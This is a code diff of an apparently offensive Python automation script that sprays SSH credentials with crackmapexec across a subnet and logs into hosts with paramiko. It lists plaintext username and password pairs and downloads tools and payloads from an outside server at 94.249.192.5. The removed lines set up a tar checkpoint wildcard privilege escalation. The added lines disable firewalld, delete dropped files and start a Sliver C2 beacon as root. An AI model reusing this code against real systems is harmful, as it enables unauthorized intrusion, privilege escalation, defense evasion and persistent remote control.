@@ -136,7 +136,7 @@ def phaseTwo():
 		pass
 	print("finished phase two tasks.")
 	
-def phaseThree():
+def phaseThreept1():
 	# Users ethan.renolds, backup, Kenneth.Mcneil, Alta.Dudley, Quentin.White, and Blake.Hayness added to 23.201
 	# ethan.reynolds - bubblewrap69, backup - michaelwashere Kenneth.Mcneil - password123, Alta.Dudley - hellokitty, Quentin.White - qweasdzxcQWEASDZXC, Blake.Hayness - qazwsxedcQAZWSXEDC
 	subnet = "208.11.25.0/24"
@@ -151,11 +151,11 @@ def phaseThree():
 	cme = f"crackmapexec ssh {subnet} -u {username} -p {password}"
 	#subprocess.run(cme, shell=True, text=True)
 	commands = [
-	"whoami",
-	f"echo {password} | sudo -S -l",
 	"pwd",
 	"curl http://94.249.192.5:8000/pspy -o /tmp/pspy",
-	"chmod +x /tmp/pspy"
+	"chmod +x /tmp/pspy",
+	"cd /var/log/mon",
+	"curl http://94.249.192.5:8000/backup.sh -o /var/log/mon/backup.sh"
 	]
 	client = paramiko.SSHClient()
 	try:
@@ -167,73 +167,56 @@ def phaseThree():
 			# Execute each command with the password
 			full_command = f"{command}"
 			stdin, stdout, stderr = client.exec_command(full_command)
-
 			# Print the output
 			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
-		# Finish command loop and then run C2 Beacon in the background
-		full_command = f"/tmp/pspy"
-		stdin, stdout, stderr = client.exec_command(full_command, timeout=190)
-		print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
 		# Close the SSH connection
 		client.close()
 	except Exception as e:
 		pass
-	tar_commands = [
-		"cd /var/log/mon",
-		"curl http://94.249.192.5:8000/backup.sh -o /var/log/mon/backup.sh"
-		"echo \"\" > '--checkpoint=1'",
-		"echo \"\" > '--checkpoint-action=exec=sh backup.sh'"
-	]
-	try:
-		# Automatically add the server's host key
-		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-		# Connect to the SSH server
-		client.connect(target_ip, username=username, password=password)
-
-		for command in tar_commands:
-			# Execute each command with the password
-			full_command = f"{command}"
-			stdin, stdout, stderr = client.exec_command(full_command)
-
-			# Print the output
-			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
-		# Finish command loop and then run C2 Beacon in the background
-		time.sleep(90)
-		# Close the SSH connection
-		client.close()
-	except Exception as e:
-		pass
+		
+def phaseThreept2():
+	target_ip = "208.11.25.204"
+	username = "backup"
+	password = "michaelwashere"
+	print("starting part two..")
+	sliverC2 = "sudo /root/lucario &"
 	commands = [
-	"sudo bash",
-	"curl http://94.249.192.5:8000/xerkitree -o /root/xerkitree",
-	"chmod +x /root/xerkitree",
+	"rm -rf /var/log/mon/backup.sh",
+	"sudo systemctl stop firewalld",
+	"curl http://94.249.192.5:8000/lucario -o /root/lucario",
+	"chmod +x /root/lucario",
 	]
-	awkC2 = "/root/xerkitree &"
 	client = paramiko.SSHClient()
 	try:
 		# Automatically add the server's host key
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
 		# Connect to the SSH server
 		client.connect(target_ip, username=username, password=password)
+
 		for command in commands:
 			# Execute each command with the password
-			full_command = f"{command}"
+			full_command = f"sudo {command}"
 			stdin, stdout, stderr = client.exec_command(full_command)
+
 			# Print the output
 			print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
 		# Finish command loop and then run C2 Beacon in the background
-		full_command = f"{awkC2}"
-		stdin, stdout, stderr = client.exec_command(full_command + '&', timeout=5)
-		print(f"Command: {full_command}\nOutput:\n{stdout.read().decode()}")
+		stdin, stdout, stderr = client.exec_command(sliverC2, timeout=5)
+		print(f"Command: {sliverC2}\nOutput:\n{stdout.read().decode()}")
 		# Close the SSH connection
 		client.close()
 	except Exception as e:
 		pass
 	print("finished phase three tasks.")
-		
 	
-
+def phaseThree():
+	phaseThreept1()
+	print("Finished Part One. Sleeping to allow cronjob privesc to run.")
+	time.sleep(60)
+	print("done. Executing part two.")
+	phaseThreept2()
+	print("Phase Three done.")
 def main():
 	# Ensure Sudo Usage
 	check_root()
